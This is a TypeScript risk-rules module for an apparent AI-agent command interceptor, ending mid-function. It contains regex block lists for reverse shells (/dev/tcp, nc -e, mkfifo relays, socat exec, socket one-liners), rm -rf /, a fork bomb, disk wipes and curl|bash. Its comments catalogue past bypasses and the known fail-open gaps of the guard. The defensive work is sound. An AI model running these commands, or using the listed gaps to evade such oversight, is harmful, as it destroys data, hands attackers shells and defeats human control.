/**
 * Centralized risk assessment rules.
 * Single source of truth — imported by command-interceptor, audit-logger, and config-defaults.
 *
 * Risk patterns are matched against a *sanitized* view of the command line
 * (see `sanitizeCommandForMatching`), not the raw string: quoted text that a
 * command consumes as DATA (a commit message, a PR body, an `echo` argument)
 * must not be mistaken for a command, while quoted text that a shell or eval
 * wrapper EXECUTES (`bash -c "…"`, `eval "…"`) must still be scanned.
 */

export type CommandRiskLevel = "low" | "medium" | "high" | "critical";

/** Directories where `rm -rf /<dir>` is catastrophic (data loss / unbootable). */
const CRITICAL_DIRS = "home|etc|usr|boot|root|sys|proc|lib|lib64|bin|sbin|opt";

/**
 * Catastrophic, irreversible commands. These are hard-blocked unconditionally —
 * no policy, mode, or deny-list can opt out of them. Kept as pattern *sources*
 * so the default policy deny-list (`DEFAULT_BLOCKED_PATTERNS`) is exactly this
 * set, byte for byte, and can never drift from it.
 */
/**
 * Reverse shells — an interactive shell handed to an attacker over a socket.
 * In an agent-security product these must never rate low/allowed (sable-0ki7:
 * evaluate_command rated them low). Folded into CRITICAL so they are hard-
 * blocked with no policy opt-out, exactly like the other catastrophes.
 *
 * Each source is matched against the *sanitized, lowercased* command (see
 * assessCommandRisk), so quoted prose and an eval's `-c`/`-e` argument are
 * already inlined — `echo /dev/tcp` is redacted to `echo`, while
 * `python3 -c '…pty.spawn("/bin/sh")'` exposes its payload. Every signature is
 * deliberately narrow: each was checked against benign look-alikes that share a
 * keyword (`nc -z`, OpenBSD `nc -C host 25`, `socat - TCP:h:p`,
 * `systemctl … docker.socket`, `node … --socket-path … --shell /bin/bash`,
 * `strace -e trace=socket /bin/sh`, `ls config/dev/tcp/`,
 * `import socket; print(...)`) with no false positive — see
 * risk-rules-reverse-shell.test.ts.
 *
 * Known static-analysis limits. These fail OPEN (rate low) because the payload
 * is unreadable after sanitization, not because a pattern is loose; they are
 * tracked for a follow-up (sable-czo1 sibling), not papered over with a broad
 * rule that would also hard-block benign commands:
 *   - a payload piped into a non-shell interpreter — `echo '<code>' | python3` —
 *     whose stdin the sanitizer redacts (the broadest gap);
 *   - a payload split across shell variables (`a=/dev/tc;b=p/…`) or hidden in an
 *     unreadable `$(…)`/base64 blob;
 *   - the quoted-operand forms of `php -r`, `socat exec:'/bin/sh'` (the program
 *     half quoted), `gawk /inet/`, `telnet`, and the non-standard `rcat`.
 * `… | sh` and base64-into-shell still degrade to high via shellProgramFromStream.
 */
const REVERSE_SHELL_PATTERN_SOURCES: string[] = [
  // bash/zsh net redirect `>& /dev/tcp/host/port`: output to the socket or fd
  // duplication onto it (`>`, `>&`, `&>`, `<>`, `<&`), or a shell reading its
  // program from it (`bash < /dev/tcp/…`; `-c` excluded so the inlined
  // payload is not mistaken for the shell's stdin). A read-only redirect —
  // the wait-for-port idiom `bash -c '</dev/tcp/h/p'`, `cat < /dev/tcp/…` —
  // and a path component (`ls config/dev/tcp/`) do not match.
  `((>|<>|[<>]&)\\s*|\\b(ba|z|da|k|a)?sh(\\s+-[abd-z]+)*\\s*<\\s*)/dev/(tcp|udp)/`,
  // …or an interactive shell anywhere beside the pseudo-device.
  `^(?=[\\s\\S]*(^|[\\s<>&;|])/dev/(tcp|udp)/)(?=[\\s\\S]*\\b(ba|z|da|k|a)?sh\\s+-[a-z]*i)`,
  // netcat with an exec flag: `-e` anywhere in a short-flag cluster (`-e`,
  // `-ve`, `-nve`) or the long `--exec`/`--sh-exec`/`--lua-exec`. `-c` is
  // intentionally omitted — after lowercasing it is indistinguishable from
  // OpenBSD `nc -C` (CRLF), and no benign nc cluster carries `e`. Plain
  // `nc -z`/`-l`/`-v`/`-nv` do not match.
  `\\b(nc|ncat|netcat)\\b[^|;&]*\\s(-[a-z]*e\\b|--(sh-|lua-)?exec\\b)`,
  // named-pipe relay `mkfifo /tmp/f; … nc …; … /bin/sh`. Requires a fifo AND a
  // netcat AND a shell (any order), so a fifo beside a benign `nc -z`/`nc -l`
  // health check does not match.
  `^(?=[\\s\\S]*\\b(mkfifo|mknod)\\b)(?=[\\s\\S]*\\b(nc|ncat|netcat)\\b)(?=[\\s\\S]*(/bin/(ba)?sh|\\b(ba)?sh\\b[^\\n]*-i))`,
  // socat with a program endpoint `EXEC:`/`SYSTEM:`. A plain relay
  // (`socat - TCP:host:port`) has neither and does not match.
  `\\bsocat\\b[\\s\\S]*\\b(exec|system):`,
  // interpreter socket one-liner, part A: a socket *call* (not the bare word,
  // which is in `--socket-path`/`docker.socket`/`trace=socket`) together with a
  // spawn that NAMES a shell. Order-independent anchored lookaheads — so a
  // payload that opens the socket after the spawn (the canonical Node.js form)
  // is still caught — and linear (no `prefix[\\s\\S]*suffix` backtracking).
  `^(?=[\\s\\S]*(socket\\.socket|\\bsocket\\s*\\(|tcpsocket\\.|io::socket|pf_inet|sock_stream|net\\.socket))(?=[\\s\\S]*(pty\\.spawn|/bin/(ba)?sh|(os\\.system|system|exec|popen|spawnsync|spawn|subprocess\\.(call|run|popen|check_output|check_call))\\s*[\\s(\\[{"']*/?(bin/)?(ba|z|da|a|k)?sh\\b))`,
  // interpreter socket one-liner, part B: a socket call + a generic exec/system
  // + socket-fd wiring (dup2/fileno/pipe/redirect/read-loop). Catches the forms
  // whose shell name arrives from the socket at runtime (perl `system $_ while
  // <$s>`, a node `.pipe()` bridge), without hard-blocking a benign socket
  // script that merely shells out (which has no such wiring).
  `^(?=[\\s\\S]*(socket\\.socket|\\bsocket\\s*\\(|tcpsocket\\.|io::socket|pf_inet|sock_stream|net\\.socket))(?=[\\s\\S]*(\\bexec\\b|\\bsystem\\b|os\\.system|subprocess\\.|\\bpopen\\s*\\(|\\bspawn\\s*\\())(?=[\\s\\S]*(dup2|fileno|\\.pipe\\s*\\(|<&|>&|fdopen|while\\s*<))`,
  // zsh TCP-module reverse shell (`zmodload zsh/net/tcp; ztcp host port; …`).
  `\\bzmodload\\b[\\s\\S]*zsh/net/tcp`,
  // powershell/pwsh TCPClient reverse shell (cross-platform pwsh on Linux too).
  `system\\.net\\.sockets\\.tcpclient`,
];

const CRITICAL_PATTERN_SOURCES: string[] = [
  // rm -rf / (root only, any flag order)
  `rm\\s+(-[a-z]*r[a-z]*\\s+)*-[a-z]*f[a-z]*\\s+/(\\s|$)`,
  `rm\\s+(-[a-z]*f[a-z]*\\s+)*-[a-z]*r[a-z]*\\s+/(\\s|$)`,
  // rm -rf on critical top-level directories
  `rm\\s+(-[a-z]*r[a-z]*\\s+)*-[a-z]*f[a-z]*\\s+/(${CRITICAL_DIRS})(/|\\s|$)`,
  `rm\\s+(-[a-z]*f[a-z]*\\s+)*-[a-z]*r[a-z]*\\s+/(${CRITICAL_DIRS})(/|\\s|$)`,
  `:\\(\\)\\{\\s*:\\|:&\\s*\\};:`,   // fork bomb
  `dd\\s+if=.*of=/dev/sd`,
  `>\\s*/dev/sd`,
  `mkfs`,
  `fdisk`,
  `parted`,
  ...REVERSE_SHELL_PATTERN_SOURCES,
];

export const CRITICAL_PATTERNS: RegExp[] = CRITICAL_PATTERN_SOURCES.map((s) => new RegExp(s));

export const HIGH_PATTERNS: RegExp[] = [
  /rm\s+(-[a-z]*r[a-z]*\s+)*-[a-z]*f[a-z]*/,  // rm -rf, -fr, -r -f, -f -r (any path)
  /rm\s+(-[a-z]*f[a-z]*\s+)*-[a-z]*r[a-z]*/,  // rm -fr, reversed
  /sudo\s+rm/,
  /chmod\s+777/,
  /curl.*\|\s*(bash|sh|zsh|dash)\b/,
  /wget.*\|\s*(bash|sh|zsh|dash)\b/,
  /git\s+push\b.*\s--force\b/,                           // --force anywhere after push
  /git\s+push\b.*\s-[a-zA-Z]*f\b/,                      // -f or combined flags like -vf
  /git\s+push\b.*\s--force-(with-lease|if-includes)\b/,  // specific force variants
  /git\s+push\s+\S*\s+\+/,                               // refspec force: git push origin +main
  /docker\s+system\s+prune/,
  /npm\s+publish/,
  /pypi.*upload/,
];

export const MEDIUM_PATTERNS: RegExp[] = [
  /sudo/,
  /chmod/,
  /chown/,
  /systemctl/,
  /service/,
  /kill\s+-9/,
  /pkill/,
  /killall/,
];

/**
 * Default policy deny-list. Identical to the built-in unconditional hard-block
 * set: a deny-list entry hard-denies, so the *defaults* must never match a
 * merely approval-grade command. (The old literals — e.g. the substring
 * "rm -rf /" — hard-denied `rm -rf /tmp/build`, which is HIGH and belongs in
 * DEFAULT_REQUIRE_APPROVAL, not in a deny-list.)
 */
export const DEFAULT_BLOCKED_PATTERNS: string[] = [...CRITICAL_PATTERN_SOURCES];

export const DEFAULT_REQUIRE_APPROVAL: string[] = [
  "rm -rf",
  "sudo rm",
  "curl.*\\|\\s*(bash|sh|zsh|dash)\\b",
  "wget.*\\|\\s*(bash|sh|zsh|dash)\\b",
  "chmod 777",
  "git push --force",
  "git push -f",
  "git push --force-with-lease",
  "git push --force-if-includes",
  "git push .* \\+",
];

// ---------------------------------------------------------------------------
// Argument-aware command sanitizer
// ---------------------------------------------------------------------------
//
// The risk patterns above describe *shell commands*. Matching them against the
// raw command line treats quoted argument text as if it were a command, so
//
//     gh pr create --body "…don't git push --force…"
//     git commit -m "don't git push --force"
//
// were flagged as force-pushes. Simply ignoring quoted text is NOT a fix: a
// shell or eval wrapper *executes* its quoted argument, so `bash -c "rm -rf /"`
// must still hard-block. The sanitizer is therefore argument-aware:
//
//   * tokenize respecting quotes, escapes, command substitution and redirects;
//   * split on chain operators (`;` `&&` `||` `|` `&`), keeping them in place so
//     pipeline rules (`curl … | bash`) still match;
//   * a shell's `-c` argument IS a command → recursively sanitize and inline it;
//   * `$(…)` / backticks (outside single quotes) ARE commands → same;
//   * arguments a command consumes as text (`echo`/`grep` operands, `-m`,
//     `--body`, …) and prose-shaped quoted arguments are DATA → redacted;
//   * everything else is preserved byte for byte.
//
// Known limitation: an *unrecognized* evaluator that takes a bare quoted command
// string with no `-c`/`-e`-style flag (e.g. a bespoke `myrunner "rm -rf /"`) has
// its argument treated as data. Anything reached through a real shell, an eval
// flag, a substitution, or an unquoted argument is still scanned.

/** Shells whose `-c` argument is a command string to execute. */
const SHELL_EXECS = new Set(["bash", "sh", "zsh", "dash", "ksh", "ash", "fish", "su"]);

/** Execs whose arguments are executable text (a remote command, a script). */
const EVAL_EXECS = new Set([
  // `trap 'cmd' EXIT` registers a command string that runs when the shell
  // LEAVES. The payload is an ordinary quoted operand, so without this it is
  // redacted as prose exactly as `echo "..."` correctly is. The deferral
  // changes the deny message and the audit trail, not the decision. (rf-zvll A2)
  "trap",
  "eval",
  "exec",
  "ssh",
  "sshpass",
  "xargs",
]);

/** Flags carrying an executable string (`bash -c`, `python -c`, `mysql -e`, `find -exec`). */
const EVAL_FLAGS = new Set(["-c", "-e", "--command", "--execute", "--eval", "-exec", "--exec"]);

/** Prefix wrappers that delegate to the command that follows them. */
const TAIL_WRAPPERS = new Set([
  "sudo", "doas", "env", "nohup", "timeout", "nice", "ionice",
  "time", "watch", "setsid", "stdbuf", "chrt", "command",
]);

/** Commands whose operands are pure text data — searching or printing, never executing. */
const TEXT_EXECS = new Set(["echo", "printf", "grep", "egrep", "fgrep", "rg", "ag", "ack"]);

/** Flags whose value is human prose (a message, a body, a title) — never a command. */
const TEXT_FLAGS = new Set([
  "-m", "--message", "--body", "--body-text", "--title", "--description",
  "--reason", "--notes", "--subject", "--comment", "--annotation",
]);

/** Operators that chain independent commands. */
const CHAIN_OPS = new Set([";", "&&", "||", "|", "&"]);

/** Operators whose following token is a redirect target (a path — never data). */
// `<<<` is deliberately ABSENT: it is a here-STRING, and its operand is stdin
// CONTENT, not a path. Treating it as a redirect target left the text
// untouched, which over-blocked a data owner (`cat <<< "…rm -rf /…" > notes.md`
// classified critical — #230's shape, one operator over) and under-blocked a
// shell one (`bash <<< "rm -rf /"` classified high, though the shell runs it).
// Falling through to the ordinary operand path asks the question the heredoc
// work already answers: does this command execute what it reads? (sable-4nt2)
const REDIRECT_OPS = new Set([">", ">>", "<", "<<"]);

/** Bound on recursion through nested shell wrappers / substitutions. */
const MAX_SANITIZE_DEPTH = 8;

interface Piece {
  /** Span in the source string. */
  start: number;
  end: number;
  /** Operator text, or null for a word. */
  op: string | null;
  /** Unquoted, unescaped word content (empty for operators). */
  text: string;
  /** Whether any part of the word was quoted. */
  quoted: boolean;
  /** Contents of any command substitutions that the shell would execute. */
  substs: string[];
}

function isOpChar(c: string): boolean {
  // \n and \r are statement separators (rf-6pqx): a newline ends a command
  // exactly as ";" does, so a payload on a later line is classified on its own.
  return c === ";" || c === "&" || c === "|" || c === ">" || c === "<" || c === "\n" || c === "\r";
}

/** Read a `$(…)` substitution starting at `i`; returns its contents and the next index. */
function readSubst(s: string, i: number): { inner: string; next: number } {
  let j = i + 2;
  let depth = 1;
  let inner = "";
  while (j < s.length && depth > 0) {
    const ch = s[j];
    if (ch === "(") depth++;
    else if (ch === ")") {
      depth--;
      if (depth === 0) { j++; break; }
    }
    inner += ch;
    j++;
  }
  return { inner, next: j };
}

/** Read a backtick substitution starting at `i`. */
function readBacktick(s: string, i: number): { inner: string; next: number } {
  let j = i + 1;
  let inner = "";
  while (j < s.length && s[j] !== "`") { inner += s[j]; j++; }
  return { inner, next: Math.min(j + 1, s.length) };
}

/**
 * Split a command line into words and operators, respecting quotes and substitutions.
 * `unterminated` is set when a quote is never closed — the parse is then unreliable
 * and the caller must FAIL CLOSED (match the raw string) rather than trust a
 * desynchronized sanitization (se-y6vo: `$'a\'b'` swallows a trailing payload).
 */
function tokenize(s: string): { pieces: Piece[]; unterminated: boolean } {
  const pieces: Piece[] = [];
  let unterminated = false;
  let i = 0;

  while (i < s.length) {
    const c = s[i];

    // Whitespace EXCEPT newlines is skipped; a newline falls through to the
    // operator branch below so it becomes a statement separator (rf-6pqx).
    if (/\s/.test(c) && c !== "\n" && c !== "\r") { i++; continue; }

    // `<(cmd)` / `>(cmd)` — PROCESS SUBSTITUTION. The content is a command that
    // RUNS, exactly as `$(cmd)` does, so it goes in substs and the existing
    // recursive scan handles it with no new rule.
    //
    // Without this the tokenizer never forms the construct: it emits op `<`,
    // which is in REDIRECT_OPS, so `(cmd` becomes a redirect TARGET and is left
    // untouched, while the remaining words are redacted as the host's data
    // operands. TWO independent wrong decisions that conspire —
    // `ack <(rm -rf /)` sanitized to `ack <(rm    `, harmless-looking head
    // preserved and dangerous tail deleted. Fixing either alone leaves the
    // bypass, which is worth knowing when reviewing this. (rf-zvll)
    if ((c === "<" || c === ">") && s[i + 1] === "(") {
      const start = i;
      const r = readSubst(s, i);
      i = r.next;
      pieces.push({ start, end: i, op: null, text: "", quoted: false, substs: [r.inner] });
      continue;
    }

    if (isOpChar(c)) {
      const start = i;
      if (c === "\n" || c === "\r") {
        // Normalize a line break (incl. CRLF) to a ";" separator piece.
        i += 1;
        pieces.push({ start, end: i, op: ";", text: ";", quoted: false, substs: [] });
        continue;
      }
      const two = s.slice(i, i + 2);
      // `<<<` before `<<`, or it tokenizes as `<<` + `<` and the here-string
      // operand becomes a redirect target — left untouched, which is how it
      // ended up both over- and under-blocked (sable-4nt2).
      const three = s.slice(i, i + 3);
      const op =
        three === "<<<"
          ? three
          : (two === "&&" || two === "||" || two === ">>" || two === "<<")
            ? two
            : c;
      i += op.length;
      pieces.push({ start, end: i, op, text: op, quoted: false, substs: [] });
      continue;
    }

    const start = i;
    let text = "";
    let quoted = false;
    const substs: string[] = [];

    while (i < s.length) {
      const ch = s[i];
      if (/\s/.test(ch) || isOpChar(ch)) break;

      if (ch === "\\") {
        // Line continuation: `\` immediately before a newline (incl. CRLF) is
        // deleted by the shell — `r\<NL>m` is `rm`, so the newline must not be
        // absorbed into the word (rf-6pqx/se-y6vo).
        const nxt = s[i + 1] ?? "";
        if (nxt === "\n") { i += 2; continue; }
        if (nxt === "\r") { i += 2; if (s[i] === "\n") i++; continue; }
        i++;
        if (i < s.length) { text += s[i]; i++; }
        continue;
      }

      // Single quotes are inert: no expansion, no substitution.
      if (ch === "'") {
        i++;
        quoted = true;
        let closed = false;
        while (i < s.length) {
          if (s[i] === "'") { closed = true; i++; break; }
          text += s[i]; i++;
        }
        if (!closed) unterminated = true;
        continue;
      }

      // Double quotes are data, but `$( )` / backticks inside them DO execute.
      if (ch === '"') {
        i++;
        quoted = true;
        let closed = false;
        while (i < s.length) {
          if (s[i] === '"') { closed = true; i++; break; }
          if (s[i] === "\\") {
            const nxt = s[i + 1] ?? "";
            if (nxt === "\n") { i += 2; continue; }
            if (nxt === "\r") { i += 2; if (s[i] === "\n") i++; continue; }
            i++;
            if (i < s.length) { text += s[i]; i++; }
            continue;
          }
          if (s[i] === "$" && s[i + 1] === "(") {
            const r = readSubst(s, i); substs.push(r.inner); i = r.next; continue;
          }
          if (s[i] === "`") {
            const r = readBacktick(s, i); substs.push(r.inner); i = r.next; continue;
          }
          text += s[i];
          i++;
        }
        if (!closed) unterminated = true;
        continue;
      }

      if (ch === "$" && s[i + 1] === "(") {
        const r = readSubst(s, i); substs.push(r.inner); i = r.next; continue;
      }
      if (ch === "`") {
        const r = readBacktick(s, i); substs.push(r.inner); i = r.next; continue;
      }

      text += ch;
      i++;
    }

    pieces.push({ start, end: i, op: null, text, quoted, substs });
  }

  return { pieces, unterminated };
}

/** `/usr/bin/rm` → `rm`; used to classify the executable of a segment. */
function execName(text: string): string {
  const base = text.slice(text.lastIndexOf("/") + 1);
  return base.toLowerCase();
}

const ENV_ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;
const SHELL_C_FLAG = /^-[a-z]*c$/;
const LONG_FLAG_WITH_VALUE = /^(--[a-z][a-z-]*)=/;
const NUMERIC_ARG = /^\d+[a-z]*$/i;

/**
 * A heredoc introducer: `<<`, optional `-`/`~` (indented-terminator forms), an
 * optional quote around the delimiter, and the delimiter word. Group 1 is the
 * dash/tilde, group 3 is the delimiter name. `g` so we can find all on a line.
 */
const HEREDOC_START = /(?<!<)<<(?!<)([-~]?)\s*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\2/g;
/** Chain/pipe operators, used to find the statement that owns a heredoc. */
const CHAIN_SPLIT = /\|\||&&|[;|&]/;

interface Replacement { start: number; end: number; with: string; }

/**
 * Decide, for one segment (a single command in a chain), which spans are DATA
 * and which are code, appending the resulting replacements.
 */
/**
 * The effective executable of a segment (`sudo rm -rf /` -> `rm`), used to ask
 * what the NEXT stage of a pipeline does with this stage's output.
 */
function segmentExec(pieces: Piece[]): string {
  const isRedirectTarget = new Array<boolean>(pieces.length).fill(false);
  for (let i = 1; i < pieces.length; i++) {
    const prev = pieces[i - 1];
    if (prev.op && REDIRECT_OPS.has(prev.op) && !pieces[i].op) isRedirectTarget[i] = true;
  }
  for (let i = 0; i < pieces.length; i++) {
    const p = pieces[i];
    if (p.op || isRedirectTarget[i]) continue;
    if (!p.quoted && ENV_ASSIGNMENT.test(p.text)) continue;
    if (!p.quoted && TAIL_WRAPPERS.has(execName(p.text))) {
      let j = i + 1;
      while (j < pieces.length) {
        const q = pieces[j];
        if (q.op || isRedirectTarget[j]) { j++; continue; }
        if (q.text.startsWith("-") || /^\d+[a-z]*$/i.test(q.text)) { j++; continue; }
        break;
      }
      i = j - 1;
      continue;
    }
    return execName(p.text);
  }
  return "";
}

function processSegment(
  pieces: Piece[],
  depth: number,
  out: Replacement[],
  pipedIntoShell = false,
  outputExecuted = false
): void {
  // A word is a redirect target when the piece before it is `>`/`>>`/`<`.
  const isRedirectTarget = new Array<boolean>(pieces.length).fill(false);
  for (let i = 1; i < pieces.length; i++) {
    const prev = pieces[i - 1];
    if (prev.op && REDIRECT_OPS.has(prev.op) && !pieces[i].op) isRedirectTarget[i] = true;
  }

  // Effective executable: skip env assignments and prefix wrappers (`sudo`,
  // `env`, `timeout 5`, `nice -n 15`, …) to reach the command they delegate to.
  let execIdx = -1;
  for (let i = 0; i < pieces.length; i++) {
    const p = pieces[i];
    if (p.op || isRedirectTarget[i]) continue;
    if (!p.quoted && ENV_ASSIGNMENT.test(p.text)) continue;
    if (execIdx === -1 && !p.quoted && TAIL_WRAPPERS.has(execName(p.text))) {
      // Skip the wrapper's own flags and their numeric/duration values.
      let j = i + 1;
      while (j < pieces.length) {
        const q = pieces[j];
        if (q.op || isRedirectTarget[j]) { j++; continue; }
        if (q.text.startsWith("-") || /^\d+[a-z]*$/i.test(q.text)) { j++; continue; }
        break;
      }
      i = j - 1;
      continue;
    }
    execIdx = i;
    break;
  }

  const exec = execIdx === -1 ? "" : execName(pieces[execIdx].text);
  const isTextExec = TEXT_EXECS.has(exec);

  // A segment is code-carrying when some part of it is a command string the
  // segment will execute: a shell, an eval-style flag, or an eval-style exec.
  // Its quoted arguments are NOT prose and must stay visible to the patterns.
  let hasShellExec = false;
  let hasEvalFlag = false;
  for (let i = 0; i < pieces.length; i++) {
    const p = pieces[i];
    if (p.op || isRedirectTarget[i]) continue;
    if (!p.quoted && SHELL_EXECS.has(execName(p.text))) hasShellExec = true;
    if (!p.quoted && EVAL_FLAGS.has(p.text.toLowerCase())) hasEvalFlag = true;
  }
  const codeCarrying = hasShellExec || hasEvalFlag || EVAL_EXECS.has(exec);

  // sable-c6an. Two questions the code conflated, and conflating them gets one
  // of them wrong:
  //   codeCarrying   — this segment RUNS a command string it was handed
  //   executesOutput — this segment's STDOUT becomes code somewhere else
  //                    (`… | bash`, or a substitution used as a -c script)
  // `bash -c "echo 'rm -rf /'"` is the first and not the second, so its operand
  // stays data; `bash -c "$(echo rm -rf /)"` is the second, so it is code.
  const executesOutput = pipedIntoShell || outputExecuted;

  let seenShell = false;
  let pendingScript = false;
  let prevTextFlag = false;

  for (let i = 0; i < pieces.length; i++) {
    const p = pieces[i];
    if (p.op) { prevTextFlag = false; continue; }

    const isExecTok = i === execIdx;
    const flagName = p.text.toLowerCase();

    if (!p.quoted && SHELL_EXECS.has(execName(p.text))) seenShell = true;

    // `bash -c <script>` — the next word is a command string, not data.
    if (pendingScript && !p.text.startsWith("-")) {
      // The script can be entirely a substitution — `bash -c "$(…)"` — where
      // `text` is EMPTY and the substitution IS the script. Reading only `text`
      // dropped it, so `bash -c "$(echo rm -rf /)"` classified low: a bypass of
      // the hard block needing no policy file (sable-c6an). The substitution's
      // OUTPUT is the script, so it sanitizes as output-executed.
      const parts: string[] = [];
      if (p.text !== "") parts.push(sanitize(p.text, depth + 1));
      for (const sub of p.substs) parts.push(sanitize(sub, depth + 1, true));
      out.push({ start: p.start, end: p.end, with: parts.join(" ") });
      pendingScript = false;
      prevTextFlag = false;
      continue;
    }

    if (seenShell && !p.quoted && SHELL_C_FLAG.test(flagName)) {
      pendingScript = true;
      prevTextFlag = false;
      continue;
    }

    // `$(…)` / backticks execute — scan their contents, drop the literal wrapper.
    if (p.substs.length > 0) {
      const inner = p.substs
        .map((s) => sanitize(s, depth + 1, codeCarrying || executesOutput))
        .join(" ");
      out.push({ start: p.start, end: p.end, with: inner });
      prevTextFlag = false;
      continue;
    }

    if (isRedirectTarget[i]) { prevTextFlag = false; continue; }
    if (isExecTok) {
      // Unquote a quoted executable so quoting the *command name* cannot break
      // the pattern anchors (`"rm" -rf /`, `r"m" -rf /`, `watch "rm -rf /"`).
      // Unquoting only ever exposes more to the patterns — the safe direction.
      if (p.quoted) out.push({ start: p.start, end: p.end, with: p.text });
      prevTextFlag = false;
      continue;
    }

    // Value of a prose flag (`-m "…"`, `--body "…"`) — always data, even inside
    // a code-carrying segment (`git commit -e -m "don't git push --force"`).
    if (prevTextFlag) {
      out.push({ start: p.start, end: p.end, with: " " });
      prevTextFlag = false;
      continue;
    }

    const longFlag = LONG_FLAG_WITH_VALUE.exec(p.text);
    if (!p.quoted && longFlag && TEXT_FLAGS.has(longFlag[1])) {
      out.push({ start: p.start, end: p.end, with: longFlag[1] });
      continue;
    }

    if (TEXT_FLAGS.has(flagName)) { prevTextFlag = true; continue; }
    prevTextFlag = false;

    // Operands of a text command (`echo`, `grep`, `printf`) are never executed.
    if (isTextExec && i > execIdx && !executesOutput) {
      out.push({ start: p.start, end: p.end, with: " " });
      continue;
    }

    if (p.quoted) {
      const isProse = /\s/.test(p.text);
      if (!isProse) {
        // Single-word quoted operand: unquote it so quoting cannot be used to
        // hide a flag or a path from the patterns (`rm "-rf" "/"`).
        out.push({ start: p.start, end: p.end, with: p.text });
      } else if (codeCarrying || executesOutput) {
        // This segment executes a command string (`ssh host "…"`, `mysql -e "…"`).
        // The quoted argument is code — unquote and scan it, recursively.
        out.push({ start: p.start, end: p.end, with: sanitize(p.text, depth + 1) });
      } else {
        // A quoted, multi-word argument to an ordinary command is prose data.
        out.push({ start: p.start, end: p.end, with: " " });
      }
    }
  }
}

/**
 * Remove `\<newline>` line continuations the way a shell does BEFORE parsing.
 * `r\<NL>m -rf /` is `rm -rf /` to bash, so the backslash-newline must be deleted
 * or the token `rm` never forms and the pattern misses it (se-y6vo). Removed when
 * unquoted or inside double quotes; PRESERVED inside single quotes.
 */
function stripLineContinuations(s: string): string {
  if (!s.includes("\\")) return s;
  let out = "";
  let i = 0;
  let inSingle = false;
  let inDouble = false;
  while (i < s.length) {
    const c = s[i];
    if (c === "'" && !inDouble) { inSingle = !inSingle; out += c; i++; continue; }
    if (c === '"' && !inSingle) { inDouble = !inDouble; out += c; i++; continue; }
    if (c === "\\" && !inSingle) {
      const nxt = s[i + 1] ?? "";
      if (nxt === "\n") { i += 2; continue; }
      if (nxt === "\r") { i += 2; if (s[i] === "\n") i++; continue; }
      // Normal escape (`\"`, `\$`, …): keep both chars so an escaped quote does
      // not flip the quote state above.
      out += c;
      if (i + 1 < s.length) { out += s[i + 1]; i += 2; } else { i++; }
      continue;
    }
    out += c;
    i++;
  }
  return out;
}

function sanitize(command: string, depth: number, outputExecuted = false): string {
  if (!command || depth > MAX_SANITIZE_DEPTH) return command;

  command = stripLineContinuations(command);
  const { pieces, unterminated } = tokenize(command);
  // Fail closed: an unterminated quote means the parse desynchronized from the
  // shell, so a sanitized view could hide an executable payload. Match the raw
  // command instead (se-y6vo).
  if (unterminated) return command;
  const replacements: Replacement[] = [];

  // Segments keep the operator that ends them, so a segment can be asked
  // whether its output feeds a shell (`echo "rm -rf /" | bash`).
  const segments: { pieces: Piece[]; endOp: string | null }[] = [];
  let segment: Piece[] = [];
  for (const p of pieces) {
    if (p.op && CHAIN_OPS.has(p.op)) {
      segments.push({ pieces: segment, endOp: p.op });
      segment = [];
      continue;
    }
    segment.push(p);
  }
  segments.push({ pieces: segment, endOp: null });

  for (let k = 0; k < segments.length; k++) {
    const next = segments[k + 1];
    const pipedIntoShell =
      segments[k].endOp === "|" &&
      next !== undefined &&
      SHELL_EXECS.has(segmentExec(next.pieces));
    processSegment(
      segments[k].pieces, depth, replacements, pipedIntoShell, outputExecuted
    );
  }

  if (replacements.length === 0) return command;

  replacements.sort((a, b) => a.start - b.start);
  let out = "";
  let cursor = 0;
  for (const r of replacements) {
    if (r.start < cursor) continue;
    out += command.slice(cursor, r.start) + r.with;
    cursor = r.end;
  }
  out += command.slice(cursor);
  return out;
}

/**
 * Normalize a command line for risk/policy pattern matching: quoted text the
 * command consumes as DATA is redacted; text a shell or eval wrapper EXECUTES
 * is preserved (and recursively sanitized). Everything else is untouched.
 */
/**
 * Does the command that owns a heredoc EXECUTE its body? `cat > f <<EOF` /
 * `grep -q x <<EOF` consume the body as DATA; `bash <<EOF` / `sh <<'EOF'` /
 * `ssh host <<EOF` EXECUTE it. Only a data body may be stripped; an executed
 * body must stay visible to the patterns (else the newline fix opens a fresh
 * bypass — se-y6vo).
 */
function heredocOwnerExecutes(line: string, ltPos: number): boolean {
  const head = line.slice(0, ltPos);
  const segments = head.split(CHAIN_SPLIT);
  const seg = segments.length ? segments[segments.length - 1] : head;
  const tokens = seg.split(/\s+/).filter((t) => t.length > 0);
  let idx = 0;
  while (idx < tokens.length) {
    const tok = tokens[idx];
    if (ENV_ASSIGNMENT.test(tok)) { idx++; continue; }
    const name = execName(tok);
    if (TAIL_WRAPPERS.has(name)) {
      idx++;
      while (idx < tokens.length && (tokens[idx].startsWith("-") || NUMERIC_ARG.test(tokens[idx]))) idx++;
      continue;
    }
    return SHELL_EXECS.has(name) || EVAL_EXECS.has(name);
  }
  return false;
}

/**
 * Blank heredoc BODIES that a command consumes as DATA, before tokenizing.
 * A body written to a file (`cat > doc.md <<EOF … EOF`) or searched
 * (`grep <<EOF … EOF`) is data, never executed. Leaving it in place makes the
 * newline-as-separator fix (rf-6pqx) classify ordinary documentation writes as
 * CRITICAL (rf-3rsj) — the same over-block public #230 reported. Stripping it
 * fixes both. A body EXECUTED by a shell/eval owner is KEPT so it is still
 * scanned. Co-designed with kerckhoffs (se-ijzs) and achebe (#230).
 */
/**
 * `cat <<EOF | bash` — the body is data to `cat`, but `cat`'s OUTPUT is the
 * script, so the body is executed after all. The owner check above only reads
 * the text BEFORE the introducer and never sees the pipe, so without this a
 * heredoc piped into a shell is stripped and the hard block is silently lost.
 * Keeping a body is the safe direction: it can only over-block, and only for a
 * shape that should block anyway.
 */
function heredocOutputPipedToShell(line: string, ltPos: number): boolean {
  const stages = line.slice(ltPos).split("|").slice(1);
  for (const stage of stages) {
    const tokens = stage.trim().split(/\s+/).filter((t) => t.length > 0);
    let idx = 0;
    while (idx < tokens.length) {
      const tok = tokens[idx];
      if (ENV_ASSIGNMENT.test(tok)) { idx++; continue; }
      const name = execName(tok);
      if (TAIL_WRAPPERS.has(name)) {
        idx++;
        while (idx < tokens.length && (tokens[idx].startsWith("-") || NUMERIC_ARG.test(tokens[idx]))) idx++;
        continue;
      }
      if (SHELL_EXECS.has(name) || EVAL_EXECS.has(name)) return true;
      break;
    }
  }
  return false;
}

function stripHeredocBodies(command: string): string {
  if (!command.includes("<<")) return command;
  const lines = command.split("\n");
  const out: string[] = [];
